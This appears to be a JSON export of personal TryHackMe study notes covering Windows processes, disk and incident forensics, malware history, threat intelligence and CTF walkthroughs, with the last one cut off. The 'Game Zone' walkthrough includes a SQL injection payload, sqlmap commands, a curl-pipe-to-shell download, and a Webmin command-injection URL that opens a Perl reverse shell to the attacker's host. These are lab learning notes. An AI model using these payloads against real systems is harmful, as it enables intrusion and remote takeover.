others)*\n- also responsible for making the Windows API available to other processes, mapping drive letters, and handling the Windows shutdown process\n- more [here](https://en.wikipedia.org/wiki/Client/Server_Runtime_Subsystem)\n\n### `wininit.exe` *(Windows Initialization Process)*\nResponsible for launching:\n- `services.exe` *(Service Control Manager)*\n- `lsass.exe` *(Local Security Authority)*\n- `lsaiso.exe` within Session 0\n\n\u003e NOTE: `lsaiso.exe` is a process associated with **Credential Guard and Key Guard**. You will only see this process if Credential Guard is enabled\n\n\n### `services.exe` *(Service Control Manager)*\n- spawned by `wininit.exe`\n- primary responsibility is to handle system services: loading services, interacting with services, starting/ending services, etc\n- maintains a db, accesible through the `sc.exe` cmd\n- info regarding services is stored in `HKLM\\System\\CurrentControlSet\\Services`\n- also loads device drivers marked as auto-start into memory\n- when user logs into a machine, this proc is responsible for setting the value of the `Last Known Good` control set, in `HKLM\\System\\Select\\LastKnownGood`, to that of the `CurrentControlSet`\n- is the parent of severaal other key procs *(e.g `svchost.exe`, `spoolsv.exe`, `msmpeng.exe`, `dllhost.exe`)*\n- more [here](https://en.wikipedia.org/wiki/Service_Control_Manager)\n\n### `svchost.exe` *(Service Host)*\n- responsible for hosting and managing Windows services\n- services are implemented as DLLs\n\t- the DLL to implement is stored in the regisstry for the service under the `Parameters` subkey in `ServiceDLL`\n\t- full path: `HKLM\\SYSTEM\\CurrentControlSet\\Services\\SERVICE NAME\\Parameters`\n\t- ![[write-ups/images/Pasted image 20220609184419.png]]\n- look for this info in Process Hacker\n\t- right-click the `svchosts.exe` proc: `Services \u003e DcomLaunch \u003e Go to Service`\n\t- ![[write-ups/images/Pasted image 20220609184640.png]]\n\t- right-click the service \u0026 select `Properties`\n\t- ![[write-ups/images/Pasted image 20220609184650.png]]\n\t- notice the `-k` parameter which is used to group similar services to share the same process *(done in order to reduce resource consumption)*. \n- since `svchost.exe` will always have multiple running procs it has been of high interest for malicious uses\n\t- adversaries create malware masquerading as this proc to try to hide amongst the legitimate `svchosts.exe` procs *(name the malware `svchost.exe` or misspell it slightly: `scvhost.exe`)*\n\t- another tactic is to install/call a malicious service *(i.e DLL)*\n\t- [nice article about the topic](https://www.hexacorn.com/blog/2015/12/18/the-typographical-and-homomorphic-abuse-of-svchost-exe-and-other-popular-file-names/)\n- more about it [here](https://en.wikipedia.org/wiki/Svchost.exe)\n\n\n### `lsass.exe` \n\u003e \"Local Security Authority Subsystem Service (**LSASS**) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens. It also writes to the Windows Security Log.\"\n\n- creates security tokens for \n\t- SAM *(Security Account Manager)*\n\t- AD *(Active Directory)*\n\t- NETLOGON\n- uses auth pkgs specified in: `HKLM\\System\\CurrentControlSet\\Control\\Lsa`\n- also targeted by adversaries since it manages authentication\n\t- common tools such as `mimikats` is used to dump credentials or they mimic this proc to hide in plain sight\n\t- [How LSASS is maliciously used and additional features that Microsoft has put into place to prevent these attacks](https://yungchou.wordpress.com/2016/03/14/an-introduction-of-windows-10-credential-guard/)\n\n### `winlogon.exe`\n- launched by `smss.exe`\n- responsible for handling the **Secure Attention Sequence** (SAS)\n\t- the `ALT+CTRL+DELETE` key combination users press to enter their username \u0026 password\n- loads the user profile: by loading the user's `NTUSER.DAT` into HKCU and via `userinit.exe` to load the shell\n- locks the creen \u0026 runs the user's screensaver\n- more about it [here](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc939862(v=technet.10)?redirectedfrom=MSDN)\n\n### `explorer.exe`\n- gives the user access to their folders and files\n- provides functionality to other features such as the Start Menu, Taskbar, etc.\n- has many child processes\n\n\n---\n\n## References\n- [User mode VS Kernel mode](https://docs.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/user-mode-and-kernel-mode)\n- [https://www.threathunting.se/tag/windows-process/](https://www.threathunting.se/tag/windows-process/)[](https://www.threathunting.se/tag/windows-process/)\n- [https://www.sans.org/security-resources/posters/hunt-evil/165/download](https://www.sans.org/security-resources/posters/hunt-evil/165/download)[](https://www.sans.org/security-resources/posters/hunt-evil/165/download)\n- [https://docs.microsoft.com/en-us/sysinternals/resources/windows-internals](https://docs.microsoft.com/en-us/sysinternals/resources/windows-internals)\n\n## See Also\n- [[write-ups/THM]]","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/disk-analysis-autopsy":{"title":"Disk Analysis Autopsy","content":"\n- What is the MD5 hash of the E01 image?\n\t- ![[write-ups/images/Pasted image 20220630082254.png]]\n- What is the computer account name?\n\t- ![[write-ups/images/Pasted image 20220630070635.png]]\n- List all the user accounts. (alphabetical order)\n\t- ![[write-ups/images/Pasted image 20220630070904.png]]\n- Who was the last user to log into the computer?\n\t- ![[write-ups/images/Pasted image 20220630071004.png]]\n\t- sivaapriya\n- What was the IP address of the computer?\n\t- ![[write-ups/images/Pasted image 20220630071342.png]]\n- What was the¬†MAC¬†address of the computer? (XX-XX-XX-XX-XX-XX)\n\t- ![[write-ups/images/Pasted image 20220630071852.png]]\n\t- 08-00-27-2c-c4-b9 \u0026 [lookup](https://rst.im/oui/0800272CC4B9)\n- Name the network cards on this computer.\n\t- ![[write-ups/images/Pasted image 20220630072913.png]]\n- What is the name of the network monitoring tool?\n\t- ![[write-ups/images/Pasted image 20220630073013.png]]\n- A user bookmarked a Google Maps location. What are the coordinates of the location?\n\t- ![[write-ups/images/Pasted image 20220630073213.png]]\n- A user had a file on her desktop. It had a flag but she changed the flag using PowerShell. What was the first flag?\n\t- we find this in shreya's desktop\n\t- ![[write-ups/images/Pasted image 20220630075221.png]]\n\t- so i decided to check the powershell history for that user: `shreya -\u003e AppData -\u003e Roaming -\u003e Microsoft -\u003e Windows -\u003e PowerShell -\u003e PSReadLine -\u003e ConsoleHost_history.txt`\n\t- ![[write-ups/images/Pasted image 20220630075432.png]]\n- The same user found an exploit to escalate privileges on the computer. What was the message to the device owner?\n\t- we know from the prev discovery in `exploit.ps1` that the answer is: `Flag{I-hacked-you}`\n\t- they've got a nice ref to the [privesc technique](https://www.youtube.com/watch?v=C9GfMfFjhYI)\n- 2 hack tools focused on passwords were found in the system. What are the names of these tools? (alphabetical order)\n\t- we see that the `H4S4N` user downloaded mimikatz\n\t- ![[write-ups/images/Pasted image 20220630075852.png]]\n\t- I also looked in the detection history of Windows Defender: `ProgramData/Microsoft/Windows Defender/Scans/History/Service/DetectionHistory`\n\t- \u0026 found `lazagna.exe` + `mimilove.exe`\n\t- ![[write-ups/images/Pasted image 20220630080257.png]]\n- There is a YARA file on the computer. Inspect the file. What is the name of the author?\n\t- keywork search on `.yar` =\u003e\n\t- ![[write-ups/images/Pasted image 20220630080725.png]]\n\t- so by navigating to `H4S4N/Downloads/mimikatz_trunk.zip` we get our yara rule file\n\t- ![[write-ups/images/Pasted image 20220630081307.png]]\n\t- Benjamin DELPY gentilkiwi\n- One of the users wanted to exploit a domain controller with an MS-NRPC based exploit. What is the filename of the archive that you found? *(include the spaces in your answer)*\n\t- @ first I thought that the suspicious `kill the memory/kill.py` script in sivapriya's desktop has anything to do with it, but I didn't find anything useful so I started looking elsewhere\n\t- with a quick google search on `MS-NRPC based exploit` we find that the exploit is [ZeroLogon](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/) =\u003e so I did a keyword search for it \u0026 found this archive\n\t- ![[write-ups/images/Pasted image 20220630082101.png]]\n\n---\n\n## References\n\n## See Also\n- [[write-ups/thm/autopsy]]\n- [[write-ups/THM]]\n","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/game-zone":{"title":"Game Zone","content":"\n## Recon\n![[write-ups/images/Pasted image 20220821112327.png]]\n\nFirst noticed that `httpd` was not running the latest version `2.4.54` \u0026 was using `2.4.18`, but didn't find [anything of value](https://www.cvedetails.com/vulnerability-list.php?vendor_id=45\u0026product_id=66\u0026version_id=553326\u0026page=1\u0026hasexp=0\u0026opdos=0\u0026opec=0\u0026opov=0\u0026opcsrf=0\u0026opgpriv=0\u0026opsqli=0\u0026opxss=0\u0026opdirt=0\u0026opmemc=0\u0026ophttprs=0\u0026opbyp=0\u0026opfileinc=0\u0026opginf=0\u0026cvssscoremin=0\u0026cvssscoremax=0\u0026year=0\u0026cweid=0\u0026order=1\u0026trc=9\u0026sha=4cda1da0c8c880d878436cb54f5ee0d53877947a) there. So I went to the web server\n\n## Getting user with sqli\n![[write-ups/images/Pasted image 20220821112636.png]]\nLooks like of those hitman websites on Tor üò∂‚Äçüå´Ô∏è. Besides some login \u0026 search functionality it doesn't seem we have much to work with here. Gobuster found `/images` \u0026 `/server-status`, but the latter one just gave us a [403 forbidden access](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/403). Now I could've started to look for a bypass, but decided to play with the login @ first for a bit since it was more spicy.\n\nBy supplying a basic payload in the username field: `' or 1=1-- -` we're redirected to `/portal.php`. Good we have [[sqli]]\n![[write-ups/images/Pasted image 20220821113342.png]]\nHere we can search for game reviews, since the login was vulnerable maybe this is too üòã\n![[write-ups/images/Pasted image 20220821113843.png]]\nWell... something happened. I guess based on the error thrown that we need a double qoute instead of a single one\n![[write-ups/images/Pasted image 20220821114234.png]]\nBut I got nothing... Thus I went to a more reliable friend [sqlmap](https://sqlmap.org/). I saved the `POST` request to `portal.php` into a file from Burp *(`right-click -\u003e Copy to file`)* \u0026 ran \n```bash\nsqlmap -r `pwd`/portalReq.txt --dbms=mysql --dump\n# OR without the request file\nsqlmap -u \"http://10.10.66.82/portal.php\" --data \"searchitem=test\" -p \"searchitem\" --method POST\n```\nWhich got me this\n![[write-ups/images/Pasted image 20220821115407.png]]\n\nSupplying the hash to [crackstation](https://crackstation.net/) has done the job for me\n![[write-ups/images/Pasted image 20220821115524.png]]\n\nWhat remains is to ssh... and we're in\n\n![[write-ups/images/Pasted image 20220821115630.png]]\n\n\n## Privesc\nFirst things first I ran [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) in memory: `curl http://10.18.12.227:8001/linpeas.sh | sh`\n- based on the old version of `sudo` I thought I might find some public exploit \u0026 I did, even multiple ones. Tried [pwfeedback Buffer Overflow](https://www.exploit-db.com/exploits/48052) and a [Heap-Based Buffer Overflow Privilege Escalation](https://www.exploit-db.com/exploits/49521) but without success\n- we see some new active ports on `10000` and `3306`, for the moment I just took a mind-note about it\n\t- ![[write-ups/images/Pasted image 20220821122143.png]]\n- it permits root login on `ssh`\n- tried to abuse [[SUID files]] on `at` \u0026 `pkexec` but failed\nIn the end I went back to the new exposed services. But how can I see what are they serving. [[SSH Tunneling]] is here for rescue ü¶∏. We can tunnel both services through `ssh` to reach them from our localhost like this:\n```bash\nssh -L 10000:localhost:10000 agent47@10.10.66.82\nssh -L 3306:localhost:3306 agent47@10.10.66.82\n```\nOnce we go to `http://localhost:10000/` we see [Webmin](https://webmin.com/) running: *\"web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more\"*\n![[write-ups/images/Pasted image 20220821123827.png]]\n\nI tried to login as `agent47` with our known password \u0026 it just worked\n![[write-ups/images/Pasted image 20220821123912.png]]\n\n\nIf we look @ the source we can find the version\n![[write-ups/images/Pasted image 20220821124254.png]]\n\nFinding around the interwebs I found this [RCE through /file/show.cgi](https://www.exploit-db.com/exploits/21851). So let's take a look at the metasploit module because we want to do things manually right ü´†?\n- first it attempts to login with the supplied credentials\n\t- ![[write-ups/images/Pasted image 20220821132200.png]]\n- then it sends a `GET` request @ `/file/show.cgi/bin/\u003crandom_char\u003e|#\u003ccmd\u003e|` \u0026 sets the cookie\n\t- ![[write-ups/images/Pasted image 20220821132347.png]]\n- since we're already logged in let's see if we can get a `ping` back with the following payload: `http://localhost:10000/file/show.cgi/show.cgi/bin/A/%7Cping -c 3 10.18.12.227%7C` *(i just added `A` as the random char \u0026 added my cmd: `ping -c 3 \u003cip\u003e`, then url-encode)*\n\t- ![[write-ups/images/Pasted image 20220821132536.png]]\n- and we got it ü•≥ so let's spawn a shell. I tried all different kind of reverse shells until whaat worked for me was the [Perl one](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md#perl) url-encoded with [this website](https://www.urlencoder.io/)\n\t- `http://localhost:10000/file/show.cgi/show.cgi/bin/A/%7Cperl -e %27use Socket%3B%24i%3D%2210.18.12.227%22%3B%24p%3D1337%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fbash -i%22%29%3B%7D%3B%27%7C`\n\t- ![[write-ups/images/Pasted image 20220821133831.png]]\n\n## See Also\n- [[write-ups/THM]]","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/history-of-malware":{"title":"History of Malware","content":"\n- Concepts of Malicious Software have been around since¬†**1949**,¬†and one of the first known theories was created by¬†[John von Neumann](https://en.wikipedia.org/wiki/Von_Neumann_architecture) who produced work detailing¬†self-replicating¬†computer programs\n\t- he also devised the von Neumann architecture *(how computers transfer data to hardware)*\n- Proven 22 years later *(1971)* by the **Creeper** worm which used [ARPANET](https://en.wikipedia.org/wiki/ARPANET) to transfer itself between computers only displaying `\"I'm the creeper, catch me if you can!\"`\n\t- technically it wasn't malware, in that it didn't produce any harm too the computers it visited, but still a POC\n- **ARPANET**: originally started out with two specific protocols - remote login \u0026 file transfers\n\t- this was the start of computers being able to communicate within networks\n\t- packet switching is used to acomplish this by breaking data into packets to then route/send said data to the receiver *(which will reassemble the packets back into data being sent)*\n\t- ![[write-ups/images/Pasted image 20220701024850.png]]\n- **Wabbit**: self-replicating¬†malware that would work so fast it drained up all of its resources \u0026 end up crashing\n\t- was only able to infect the machine it was put on and did¬†**not**¬†pass via a network, hence why it is not classed as a¬†_worm_\n\t- it was being a form of denial-of-service known as a [fork-bomb](https://en.wikipedia.org/wiki/Fork_bomb)\n\t- creating an infinite loop that continually creates system processes and copies of the original file, creating a high number of¬†_CPU cycles_¬†*(the time for the execution of one process)*¬†which \"constipates\" the system and consumes operating system resources, causing it to get slower until its eventual crash\n- **ANIMAL**: the first [trojan](https://en.wikipedia.org/wiki/Trojan_horse_(computing)), created by John Walter, would act as a game and ask the user a number of questions to guess the type of animal they were thinking of. Whilst the user played the \"fun\" game, another program, or subroutine, called \"PERVADE\" would create a copy of itself and¬†_ANIMAL_¬†in every directory that the user has access toA *(more about it [here](https://www.fourmilab.ch/documents/univac/animal.html))*\n- **Elk Cloner**: one of the first¬†_microcomputer viruses_ *(1982)*¬†that spread outside of a computer system or laboratory *(i.e in the wild)*\n\t- written by a 15 year-old _high school student_¬†known for his pranks and practical jokes\n\t- used a technique now called¬†_\"boot sector virus\"_\n\t- The program was placed into a game's code until an unsuspecting victim started the game for the 50th time. Instead of lunching the game it would display the following poem:\n\t\t```\n\t\tElk Cloner: The program with a personality  \n\t\tit will get on all your disks  \n\t\tit will infiltrate your chips  \n\t\tYes, it's Cloner!  \n\t\tIt will stick to you like glue  \n\t\tIt will modify RAM too  \n\t\tSend in the Cloner!  \n\t\t```\n\t- If the computer booted from an¬†_infected_¬†floppy disk, a copy of the virus was placed in the computer's memory, this then spread to¬†_uninfected_¬†discs that were inserted into infected computers. Elk Cloner also wrote a¬†_signature byte_¬†to the disk's directory, indicating that it had already been infected\n\t- **Boot Sector Viruses**:¬†are less common in modern technology, but still are relevant and important to know about. They usually infect the boot sector (the part which starts the computer) and once infected, they will try to infect every disc inserted into the infected computer but can be removed. The computer does¬†not¬†have to successfully boot in order for the computer to become infected. (you will only see this with floppy discs)\n- **The Morris Internet Worm**: released in¬†**1988**,¬†**Robert Tappan Morris**¬†created a worm that was supposed to highlight security flaws of the academic networks that it travelled to\n\t- only downfall of the worm was that it failed to check which computers it had already been to, thus infecting many computers multiple times and causing a DoS attack\n\t- Morris was the first person to be arrested from a felony conviction in the US under the 1986 [Computer Fraud and Abuse act](https://en.wikipedia.org/wiki/Data_Protection_Act_2018)\n\t- the worm spread simply by exploiting known vulnerabilities in Unix Sendmail, rsh (remote shell)/[rexec](https://en.wikipedia.org/wiki/Berkeley_r-commands)¬†and weak passwords\n\t- it infected 2000 computers in 15h \u0026 it often took 2 days to get it off a computer, rendering it useless. 6000¬† computers were infected in the end and this was around 10% of the internet at the time\n\t- although it caused a lot of damage it raised awareness of the dangers of weak passwords\n- **Cascade**: DOS malware, notably the first type to use a form of encryption to keep the program undetected\n\t- in the 80s, specifically on the¬†**Digital Equipment**¬†*(a large computer company)*¬†operating systems,¬†a common file extension for executables was `.COM` *(similar to how a batch file/`.sh` file would work now)* which allowed text files containing commands to be executable\n\t- the virus would only work by executing the infected file. Each time the infected file was run, it would slowly make changes to the computer\n\t- the virus would try not to infect¬†[IBM Computers](https://www.ibm.com/uk-en)¬†by looking for text containing a copyright statement. However, this failed due to a bug which allowed it to infect all computers\n\t- was truly a big virus, some accounts claiming there were 40 different variants\n\t- [cascade malware in action](https://www.youtube.com/watch?v=z7g-v3d7-Gk)\n\n---\n\n## References\n- [Malware Wiki](https://malwiki.org/index.php?title=Main_Page)\n\n## See Also\n- [[write-ups/THM]]\n","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/investigating-windows":{"title":"Investigating Windows","content":"\n- Whats the version and year of the windows machine?\n\t- `WinKey + R` -\u003e `winver` \u003e Windows Server 2016\n- Which user logged in last?\n\t- found dope [powershell script](https://thesysadminchannel.com/get-computer-last-login-information-using-powershell/) that does just that\n\t- alternatively look in event logs: `Get-WinEvent -FilterHashTable @{Logname=\"Security\";ID=4672}  | select @{N='User';E={$_.Properties[1].Value}}`\n\t- ![[write-ups/images/Pasted image 20220620193431.png]]\n- When did John log onto the system last?\n\t- with `cmd.exe`: `net user John`\n\t- ![[write-ups/images/Pasted image 20220620193534.png]]\n- What IP does the system connect to when it first starts?\n\t- we can check the registry by `winkey + R -\u003e regdit`\t\n\t- there we can see if there's anything in [`HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`](https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys) *(run program whenever a user logs in)* which is commonly used by adversaries\n\t- ![[write-ups/images/Pasted image 20220620194450.png]]\n- What two accounts had administrative privileges (other than the Administrator user)?\n\t- go to `Computer Management \u003e Local Users \u0026 Groups \u003e Groups \u003e administrators`\n\t- ![[write-ups/images/Pasted image 20220620194955.png]]\n- Whats the name of the scheduled task that is malicous?\n\t- list all scheduled tasks: `Get-ScheduledTask | Get-ScheduledTaskInfo | Select TaskName,TaskPath,LastRunTime`\n\t- ![[write-ups/images/Pasted image 20220620195743.png]]\n\t- we see some suspicious looking tasks *(i.e updatee windows, clean file system, falshupdate22)*\n- What file was the task trying to run daily? \u0026 What port did this file listen locally for?\n\t- we can get more info about the task with: `Get-ScheduledTask -TaskName \"Clean file system\" -Verbose | Select *`\n\t- ![[write-ups/images/Pasted image 20220620200702.png]]\n- When did Jenny last logon?\n\t- ![[write-ups/images/Pasted image 20220620200809.png]]\n- At what date did the compromise take place?\n\t- look for [User create events](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720): `Get-WinEvent -FilterHashTable @{Logname=\"Security\";ID=4720}`\n\t- ![[write-ups/images/Pasted image 20220620201241.png]]\n- At what time did Windows first assign special privileges to a new logon?\n\t- [Special priviliges assigned to new logon](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4672)\n\t- ![[write-ups/images/Pasted image 20220620203233.png]]\n\t- not worked\n\t- open `Event Viewer \u003e Custom View` with ids of `4624,4672` \u0026 sort by Date \u0026 Time\n\t- got hint of `00/00/0000 0:00:49 PM` so we look for second `49`\n\t- ![[write-ups/images/Pasted image 20220620204135.png]]\n- What tool was used to get Windows passwords?\n\t- if we look closer @ the previous sscheduled task we find out the attacker used [powercat](https://www.kali.org/tools/powercat/) for a reverse shell\n\t- now, if we look @ the other scheduled tasks we find `GameOver`\n\t- ![[write-ups/images/Pasted image 20220620204800.png]]\n\t- this will run every 5 minutes, retrieves clear text passwords, kerberos tickets, pin codes, etc from the [[write-ups/thm/core-windows-processes#lsass exe|lsass.exe]]\n\t- the tool used to do this is [mimikatz](https://github.com/ParrotSec/mimikatz)\n- What was the attackers external control and command servers IP? \u0026 Check for¬†DNS¬†poisoning, what site was targeted?\n\t- looking @ the [hosts](https://en.wikipedia.org/wiki/Hosts_(file)) file we see that `google.com` was poisoned to redirect to the attackere's C\u0026C servers\n\t- ![[write-ups/images/Pasted image 20220620205620.png]]\n- What was the extension name of the shell uploaded via the servers website? \u0026 What was the last port the attacker opened?\n\t- Windows firewall‚Äôs¬†**Inbound Rules**¬†defend the network against the incoming traffic, but it also contains information about the port \u0026 address of the local/remote server\n\t- ![[write-ups/images/Pasted image 20220620205822.png]]\n\t- Microsoft uses IIS (Internet Informaion Services) as a default web server on the Windows \u0026 the default path for the webserver files is: `C:\\inetpub\\wwwroot`\n\t- ![[write-ups/images/Pasted image 20220620210155.png]]\n\n---\n\n## See Also\n- [[write-ups/thm/windows-event-logs]]\n- [[write-ups/thm/core-windows-processes]]\n- [[write-ups/THM]]\n","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/isac":{"title":"ISAC","content":"\nInformation Sharing and Analysis Centers *(ISACs)*, are used to share and exchange various Indicators of Compromise *(IOCs: MD5s, Ips, YARA rules)* to obtain threat intelligence\n\n## What is Threat Intelligence *(TI)*\n- TI or Cyber Threat Intelligence *(CTI)* is used to map thee threat landscape \u0026 their Tactics, Techniques \u0026 Procedures *(TTP)* which typically revolve around APT groups *(known or new)*\n- data -\u003e analyzed \u0026 actionable -\u003e threat intel\n\t- it needs context in order to become intel\n- CTI is used by corporations to share knowledge about emerging threats *(keep in mind that adveraries change their TTPs all the time =\u003e TI ladscape is constantly changing)*\n- vendors/corps will share this knowledge base of intel in Information Sharing \u0026 Analysis Centers *(ISACs)*\n- broken up  in 3 diff types\n\t1. Strategic: assist senior management make informed decisions specifically about the security budget and strategies\n\t2. Tactical: interacts with the TTPs and attack models to identify adversary attack patterns.\n\t3. Operational: interact with IOCs and how the adversaries operationalize\n\n## What are ISACs\n\u003e \"Information Sharing and Analysis Centers (ISACs) are member-driven organizations, delivering all-hazards threat and mitigation information to asset owners and operators\" - National Council of ISACs\n\n- Maintain situational awareness by sharing and collaborating to maintain CTI, through a [National Council of ISACs](https://www.nationalisacs.org/) *(see [members](https://www.nationalisacs.org/member-isacs-3))*\n- ISACs\n\t- [US-CERT](https://us-cert.cisa.gov/)\n\t- [AlienVault OTX](https://otx.alienvault.com/)\n\t- [ThreatConnect](https://threatconnect.com/)\n\t- [MISP](https://www.misp-project.org/)\n\t- [ThreatConnect](https://threatconnect.com/)\n\n\n## Using AlientVault OTX to gather TI\n- **Overview of a Pulse**: can consist of a description, tags, indicator types *(file hash, Yara, IP, domain, etc.)*, and threat infrastructure *(country of origin)*. OTX uses pulses as their indicators. A majority of pulses are community-created and maintained. Not all pulses are legit or may contain inaccurate information. Always verify and analyze the indicators used before using them for CTI\n\n### Looking @ the [Xanthe - Docker aware miner](https://otx.alienvault.com/pulse/5fc6767d4cca089129062db9)\n- ![[write-ups/images/Pasted image 20220608000446.png]]\n\t- `reference` section can be used to verify \u0026 get further background info on the indicators/pulse\n\t- `description` gives a brief idea of what the pulse is \u0026 how it was gathered \n\t- `ATT\u0026CK IDs` can be used to quickly identify what TTPss are being used \u0026 familiarize yourself with them by using the [Mitre](../../sheets/Mitre.md) tools\n- ![[write-ups/images/Pasted image 20220608000925.png]]\n\t- the Indicator Overview will give you a very brief statistical representation of the indicators within the pulse as well as threat infrastructure\n- ![[write-ups/images/Pasted image 20220608000957.png]]\n\t- `Type`: the type of indicator *(URL, File Hash, IP, Domain, etc.)*\n\t- `Indicator`: the indicator itself\n\t- `Added`: date added, pulses can be updated this can be useful to track the pulses history\n\t- `Active`: shows, whether the indicator is still seen in the wild and active, can be useful when selecting pulses to use.\n\t- `Related Pulses`: shows pulses that share the same indicator, can be useful to cross-check indicators.\n\t- `Extra Information (Advanced)`: these are the advanced options including Dynamic Analysis, Network Activity, and YARA rules.\n### Finding Pulses\nBased on:\n- malware: [LoveLetter](https://otx.alienvault.com/malware/%23fp539598-VBS%2FLoveLetter/)\n\t- allows you to very quickly find IOCs and rules for a specific strain of malware\n\t- malware authors are constantly working to change and mitigate indicators and signatures, be aware that indicators change when looking for specific indicators\n\t- includes: features of the malware, related pulses, process visualization, and file samples if available.\n- adversaries: [Stealth Mango \u0026 Tangelo](https://otx.alienvault.com/adversary/ Stealth Mango and Tangelo )\n- industry: [Finance](https://otx.alienvault.com/industry/Finance)\n\n\n\n## Creating IOCs\nTools can help with the creation:\n- [winmd5free](https://www.winmd5.com/)\n- `strnings`\n- IOC Editors: [Fireeye](https://www.fireeye.com/services/freeware/ioc-editor.html) / [Mandiant](https://www.mandiant.com/resources/openioc-basics)\n\n### `cerber.exe` - ransomware\n- rdp into windows client: `rdesktop -u Jon -p \u003cpassword\u003e \u003cip\u003e:\u003cport\u003e`\n- `MD5 hash` of `.exe`: `8b6bc16fd137c09a08b02bbe1bb7d670`\n- `.\\strings.exe`\n\t- found possible IOCs *(e.g Ips, BTC addr, uniq function  names, etc)*:\n\t\t```bash\n\t\t11111kicu4p3050f55f298b5211cf2bb82200aa00bdce0bf\n\t\t2222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222\n\t\tieeWWWURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRUWWWeei\n\t\tqnleeeWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWeeelnq\n\t\t2222222GwwwwG222222\n\t\t66222288wwww8822226\n\t\t77777889wwww9887777\n\t\t##$$$$$$$##\n\t\ta\u003e77777@AwwwwA@@7777\n\t\tWRRRTUUUwvvwUUURRWW\n\t\tWWWWWWUUUywwyeUWWWWWW!)\n\t\trrnddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddnrr\n\t\t===@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=@@@==\n\t\t\u003csupportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/\u003e\n\t\t\u003csupportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/\u003e\n\t\t\u003csupportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/\u003e\n\t\t```\n\n---\n\n## References\n- [The Zoo Malware Repo](https://github.com/ytisf/theZoof)\n- [APT Groups \u0026 Ops](https://docs.google.com/spreadsheets/u/1/d/1H9_xaxQHpWaa4O_Son4Gx0YOIzlcBWMsdvePFX68EKU/pubhtml)\n\n## See Also\n- [[write-ups/THM]]","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/jacob-the-boss":{"title":"Jacob The Boss","content":"\n## Recon\n![[write-ups/images/Pasted image 20220602213430.png]]\n\n- checking `jacobtheboss.box` on 80 gives us a dummy blog\n\t- ![[write-ups/images/Pasted image 20220819064559.png]]\n\t- tried sqli on `index.php?q=` search query, but nothing found\n\t- let `gobuster` run in the backgroundA\n\n### Enumerating JBOSS\n- went to `http://jacobtheboss.box:8080/` \u0026 was presented with this\n\t- ![[write-ups/images/Pasted image 20220819064846.png]]\n- [JBoss](https://jbossas.jboss.org/) is an unmaintained project as their home page specifies\n\t- ![[write-ups/images/Pasted image 20220819065210.png]]\n- since thee machine's name is *\"Jacob the boss\"* \u0026 that they literally say it's likely to contain bugs \u0026 security vulnerabilities I figured this was the intended way \n- `/web-console/ServerInfo.jsp` \u0026 `/status?full=true` often reveal valuable server details\n\t- ![[write-ups/images/Pasted image 20220819070003.png]]\n\t- ![[write-ups/images/Pasted image 20220819070118.png]]\n- [haktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/jboss) got a note on JBOSS which directed me to [jexboss](https://github.com/joaomatosf/jexboss), a tool specifically made to test \u0026 exploit java deserialization vulnerabilities\n\n## Initial Foothold\nGot the tool installed locally \u0026 ran it hoping for a shell. I know, blindly throwing exploits might not be a good idea if I were in an actual assesment, but it's a CTF =\u003e just needed to get things done *(for in-depth details about the exploit check [this section](#Wait what just happened))*\n![[write-ups/images/Pasted image 20220819071051.png]]\nThe gods were with me today \u0026 I got a shell. \n\n## Wait... what just happened\n\u003e **Note**: this section goes into detail on how this exploit actually works. However, if you just want shells \u0026 use other people scripts without understanding what you're doing, skip this part.\n\n`jexboss.py` tells us it's vulnerable to `jmx-console`, `web-console` \u0026 `JMXInvokerServlet`. I'll focus on the latter one in this PoC.\n\n\n### Examining `jexboss.py` \n`check_vul(url)` is checking the following paths\n![[write-ups/images/Pasted image 20220819090040.png]]\nthe `exploit_jmx_invoker_file_repository` it sends a serialized object through a `POST` req @ `/invoker/JMXInvokerServlet` \n![[write-ups/images/Pasted image 20220819090412.png]]\n\n\n### Getting deep into source-code\nFiring up burp to send a `GET` request to `/invoker/JMXInvoker` gets us ssome [java serialized 